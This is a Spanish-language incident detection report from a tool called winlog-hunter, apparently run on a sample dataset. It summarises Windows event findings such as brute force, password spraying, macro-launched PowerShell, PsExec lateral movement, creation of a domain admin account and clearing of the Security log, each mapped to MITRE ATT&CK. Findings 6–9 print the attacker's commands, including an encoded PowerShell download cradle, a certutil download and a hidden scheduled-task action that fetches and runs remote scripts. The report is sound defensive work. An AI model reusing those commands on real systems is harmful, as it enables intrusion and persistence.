# Informe de winlog-hunter

- **Eventos analizados:** 208 en 1 fichero(s)
- **Periodo:** 2026-11-03 07:33:30 UTC a 2026-11-03 10:28:45 UTC
- **Generado:** 2026-11-07 17:17:02 UTC con winlog-hunter 0.1.0

| Severidad | Hallazgos |
|---|---|
| CRÍTICA | 3 |
| ALTA | 9 |
| MEDIA | 1 |
| BAJA | 2 |

## Resumen

| # | Severidad | Regla | Hallazgo | Equipo | Primera vez |
|---|---|---|---|---|---|
| 1 | CRÍTICA | WLH-003 | 'administrador' inició sesión con éxito desde 203.0.113.50 tras 15 intentos fallidos | SRV-APP | 2026-11-03 09:10:00 UTC |
| 2 | CRÍTICA | WLH-009 | 'CN=soporte\_tmp,CN=Users,DC=corp,DC=local' añadido a 'Admins. del dominio' por 'mlopez' | DC01 | 2026-11-03 10:04:00 UTC |
| 3 | CRÍTICA | WLH-005 | Se borró el registro 'Security' en DC01 (usuario: mlopez) | DC01 | 2026-11-03 10:10:00 UTC |
| 4 | ALTA | WLH-002 | 198.51.100.23 probó 9 cuentas distintas en 1 min 20 s | DC01 | 2026-11-03 08:30:00 UTC |
| 5 | ALTA | WLH-001 | 15 inicios de sesión fallidos para 'administrador' desde 203.0.113.50 en 2 min 48 s | SRV-APP | 2026-11-03 09:10:00 UTC |
| 6 | ALTA | WLH-010 | PowerShell sospechoso en WS-CONTA01: comando codificado (-EncodedCommand), descarga remota, ejecución dinámica (IEX), ventana oculta, sin perfil | WS-CONTA01 | 2026-11-03 09:40:00 UTC |
| 7 | ALTA | WLH-012 | winword.exe lanzó powershell.exe en WS-CONTA01 | WS-CONTA01 | 2026-11-03 09:40:00 UTC |
| 8 | ALTA | WLH-011 | certutil.exe usado para descarga o decodificación de ficheros en WS-CONTA01 | WS-CONTA01 | 2026-11-03 09:42:00 UTC |
| 9 | ALTA | WLH-007 | Tarea '\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck' creada en WS-CONTA01 por mlopez | WS-CONTA01 | 2026-11-03 09:45:00 UTC |
| 10 | ALTA | WLH-004 | 'mlopez' inició sesión en 4 equipos desde 10.0.0.21 en 9 min | DC01, SRV-APP, SRV-BACKUP, SRV-FILES | 2026-11-03 09:50:00 UTC |
| 11 | ALTA | WLH-006 | Servicio 'PSEXESVC' instalado en SRV-APP | SRV-APP | 2026-11-03 09:54:00 UTC |
| 12 | ALTA | WLH-009 | 'S-1-5-21-1004336348-1177238915-682003330-1145' añadido a 'Administradores' por 'mlopez' | DC01 | 2026-11-03 10:03:00 UTC |
| 13 | MEDIA | WLH-008 | Cuenta 'soporte\_tmp' creada por 'mlopez' en DC01 | DC01 | 2026-11-03 10:02:00 UTC |
| 14 | BAJA | WLH-006 | Servicio 'Google Update Service (gupdate)' instalado en WS-DIR05 | WS-DIR05 | 2026-11-03 07:50:00 UTC |
| 15 | BAJA | WLH-007 | Tarea '\\GoogleUpdateTaskMachineUA' creada en WS-DIR05 por SYSTEM | WS-DIR05 | 2026-11-03 07:51:00 UTC |

## Detalle

### 1. [CRÍTICA] WLH-003 · Inicio de sesión correcto tras fuerza bruta

'administrador' inició sesión con éxito desde 203.0.113.50 tras 15 intentos fallidos

- **MITRE ATT&CK:** T1110, T1078
- **Ventana:** 2026-11-03 09:10:00 UTC a 2026-11-03 09:13:30 UTC (16 evento(s))
- **Usuario:** administrador
- **Dominio:** CORP
- **Origen:** 203.0.113.50
- **Intentos fallidos previos:** 15
- **Tipo de logon:** 10 (RDP)
- **Id de logon:** 0x63b973

### 2. [CRÍTICA] WLH-009 · Miembro añadido a grupo privilegiado

'CN=soporte\_tmp,CN=Users,DC=corp,DC=local' añadido a 'Admins. del dominio' por 'mlopez'

- **MITRE ATT&CK:** T1098
- **Ventana:** 2026-11-03 10:04:00 UTC a 2026-11-03 10:04:00 UTC (1 evento(s))
- **Grupo:** Admins. del dominio
- **Sid grupo:** S-1-5-21-1004336348-1177238915-682003330-512
- **Miembro:** CN=soporte\_tmp,CN=Users,DC=corp,DC=local
- **Sid miembro:** S-1-5-21-1004336348-1177238915-682003330-1145
- **Añadido por:** mlopez

### 3. [CRÍTICA] WLH-005 · Registro de eventos borrado

Se borró el registro 'Security' en DC01 (usuario: mlopez)

- **MITRE ATT&CK:** T1070.001
- **Ventana:** 2026-11-03 10:10:00 UTC a 2026-11-03 10:10:00 UTC (1 evento(s))
- **Registro:** Security
- **Usuario:** mlopez
- **Dominio:** CORP

### 4. [ALTA] WLH-002 · Password spraying

198.51.100.23 probó 9 cuentas distintas en 1 min 20 s

- **MITRE ATT&CK:** T1110.003
- **Ventana:** 2026-11-03 08:30:00 UTC a 2026-11-03 08:31:20 UTC (9 evento(s))
- **Origen:** 198.51.100.23
- **Cuentas distintas:** 9
- **Cuentas:** admin, administrador, aperez, backup, cmartin, invitado, jgarcia, scanner, soporte
- **Intentos:** 9
- **Motivos:** usuario inexistente: 5, contraseña incorrecta: 4

### 5. [ALTA] WLH-001 · Fuerza bruta de credenciales

15 inicios de sesión fallidos para 'administrador' desde 203.0.113.50 en 2 min 48 s

- **MITRE ATT&CK:** T1110.001
- **Ventana:** 2026-11-03 09:10:00 UTC a 2026-11-03 09:12:48 UTC (15 evento(s))
- **Usuario:** administrador
- **Origen:** 203.0.113.50
- **Intentos:** 15
- **Tipos de logon:** 10 (RDP)
- **Motivos:** contraseña incorrecta: 15

### 6. [ALTA] WLH-010 · PowerShell sospechoso

PowerShell sospechoso en WS-CONTA01: comando codificado (-EncodedCommand), descarga remota, ejecución dinámica (IEX), ventana oculta, sin perfil

- **MITRE ATT&CK:** T1059.001
- **Ventana:** 2026-11-03 09:40:00 UTC a 2026-11-03 09:40:00 UTC (1 evento(s))
- **Usuario:** CORP\\mlopez
- **Proceso padre:** C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
- **Linea de comandos:** powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=
- **Comando decodificado:** IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')
- **Indicadores:** comando codificado (-EncodedCommand), descarga remota, ejecución dinámica (IEX), ventana oculta, sin perfil

### 7. [ALTA] WLH-012 · Office lanzando una shell

winword.exe lanzó powershell.exe en WS-CONTA01

- **MITRE ATT&CK:** T1566.001, T1204.002
- **Ventana:** 2026-11-03 09:40:00 UTC a 2026-11-03 09:40:00 UTC (1 evento(s))
- **Proceso padre:** C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
- **Proceso hijo:** C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
- **Usuario:** CORP\\mlopez
- **Linea de comandos:** powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=

### 8. [ALTA] WLH-011 · Uso malicioso de binario del sistema (LOLBin)

certutil.exe usado para descarga o decodificación de ficheros en WS-CONTA01

- **MITRE ATT&CK:** T1105, T1140
- **Ventana:** 2026-11-03 09:42:00 UTC a 2026-11-03 09:42:00 UTC (1 evento(s))
- **Binario:** certutil.exe
- **Tecnica:** descarga o decodificación de ficheros
- **Usuario:** CORP\\mlopez
- **Proceso padre:** C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
- **Linea de comandos:** certutil.exe -urlcache -split -f http://203.0.113.50/tools.zip C:\\Users\\Public\\tools.zip

### 9. [ALTA] WLH-007 · Tarea programada creada

Tarea '\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck' creada en WS-CONTA01 por mlopez

- **MITRE ATT&CK:** T1053.005
- **Ventana:** 2026-11-03 09:45:00 UTC a 2026-11-03 09:45:00 UTC (1 evento(s))
- **Tarea:** \\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck
- **Usuario:** mlopez
- **Accion:** powershell.exe -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.50/b.ps1')"
- **Indicadores:** comando sospechoso: 'powershell'

### 10. [ALTA] WLH-004 · Posible movimiento lateral

'mlopez' inició sesión en 4 equipos desde 10.0.0.21 en 9 min

- **MITRE ATT&CK:** T1021
- **Ventana:** 2026-11-03 09:50:00 UTC a 2026-11-03 09:59:00 UTC (4 evento(s))
- **Usuario:** mlopez
- **Origen:** 10.0.0.21
- **Equipos destino:** DC01, SRV-APP, SRV-BACKUP, SRV-FILES
- **Tipos de logon:** 3 (red)

### 11. [ALTA] WLH-006 · Nuevo servicio instalado

Servicio 'PSEXESVC' instalado en SRV-APP

- **MITRE ATT&CK:** T1543.003, T1569.002, T1021.002
- **Ventana:** 2026-11-03 09:54:00 UTC a 2026-11-03 09:54:00 UTC (1 evento(s))
- **Servicio:** PSEXESVC
- **Ruta:** %SystemRoot%\\PSEXESVC.exe
- **Cuenta:** LocalSystem
- **Tipo de inicio:** demand start
- **Indicadores:** servicio típico de ejecución remota (PsExec o similar)

### 12. [ALTA] WLH-009 · Miembro añadido a grupo privilegiado

'S-1-5-21-1004336348-1177238915-682003330-1145' añadido a 'Administradores' por 'mlopez'

- **MITRE ATT&CK:** T1098
- **Ventana:** 2026-11-03 10:03:00 UTC a 2026-11-03 10:03:00 UTC (1 evento(s))
- **Grupo:** Administradores
- **Sid grupo:** S-1-5-32-544
- **Sid miembro:** S-1-5-21-1004336348-1177238915-682003330-1145
- **Añadido por:** mlopez

### 13. [MEDIA] WLH-008 · Cuenta de usuario creada

Cuenta 'soporte\_tmp' creada por 'mlopez' en DC01

- **MITRE ATT&CK:** T1136
- **Ventana:** 2026-11-03 10:02:00 UTC a 2026-11-03 10:02:00 UTC (1 evento(s))
- **Cuenta:** soporte\_tmp
- **Creada por:** mlopez
- **Dominio:** CORP

### 14. [BAJA] WLH-006 · Nuevo servicio instalado

Servicio 'Google Update Service (gupdate)' instalado en WS-DIR05

- **MITRE ATT&CK:** T1543.003
- **Ventana:** 2026-11-03 07:50:00 UTC a 2026-11-03 07:50:00 UTC (1 evento(s))
- **Servicio:** Google Update Service (gupdate)
- **Ruta:** "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /svc
- **Cuenta:** LocalSystem
- **Tipo de inicio:** auto start

### 15. [BAJA] WLH-007 · Tarea programada creada

Tarea '\\GoogleUpdateTaskMachineUA' creada en WS-DIR05 por SYSTEM

- **MITRE ATT&CK:** T1053.005
- **Ventana:** 2026-11-03 07:51:00 UTC a 2026-11-03 07:51:00 UTC (1 evento(s))
- **Tarea:** \\GoogleUpdateTaskMachineUA
- **Usuario:** SYSTEM
- **Accion:** C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler
